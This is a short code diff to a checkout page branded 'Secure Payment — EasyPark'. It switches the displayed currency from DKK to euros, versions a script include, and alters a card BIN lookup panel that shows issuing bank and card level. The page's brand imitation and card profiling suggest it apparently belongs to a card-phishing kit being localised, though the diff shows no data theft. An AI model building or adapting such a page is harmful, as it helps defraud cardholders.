@@ -2,7 +2,7 @@
 <html lang="de"><head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
 <title>Secure Payment — EasyPark</title>
-<script src="/static/js/i18n.js"></script>
+<script src="/static/js/i18n.js?v=2"></script>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 <style>
 *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
@@ -95,7 +95,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
     <div style="display:flex;align-items:center;justify-content:space-between">
       <div>
         <div style="font-size:11px;color:#872879;font-weight:600;text-transform:uppercase;letter-spacing:.05em" data-i18n="total_due">Total due</div>
-        <div style="font-size:30px;font-weight:900;color:#56004D;line-height:1.1">{{ session.total_price }} <span style="font-size:16px;font-weight:600">DKK</span></div>
+        <div style="font-size:30px;font-weight:900;color:#56004D;line-height:1.1">{{ session.total_price }} <span style="font-size:16px;font-weight:600">€</span></div>
       </div>
       <div style="width:48px;height:48px;background:linear-gradient(135deg,#872879,#740668);border-radius:14px;display:flex;align-items:center;justify-content:center">
         <i class="fas fa-credit-card" style="color:#fff;font-size:20px"></i>
@@ -236,7 +236,7 @@ input[type=number]::-webkit-inner-spin-button{-webkit-appearance:none}
 
       <button type="submit" class="btn-pay">
         <i class="fas fa-lock" style="font-size:14px"></i>
-        <span data-i18n="pay_now">PAY NOW</span> — {{ session.total_price }} DKK
+        <span data-i18n="pay_now">PAY NOW</span> — {{ session.total_price }} €
       </button>
       <p style="text-align:center;font-size:11px;color:#94a3b8;margin:10px 0 0">
         <span data-i18n="ssl">Secured SSL 256-bit connection</span>
@@ -329,7 +329,6 @@ function applyBIN(d){
   const levelColors={gold:'#b7791f',platinum:'#475569',business:'#1e40af',classic:'#374151',standard:'#374151',premium:'#7c3aed'};
   const levelColor=levelColors[level]||'#374151';
   if(bank||brand){
-    el.style.display='flex';
     const bankEl=document.getElementById('bin-bank');
     bankEl.textContent=bank||(brand.charAt(0).toUpperCase()+brand.slice(1).toLowerCase());
     const typeEl=document.getElementById('bin-type');
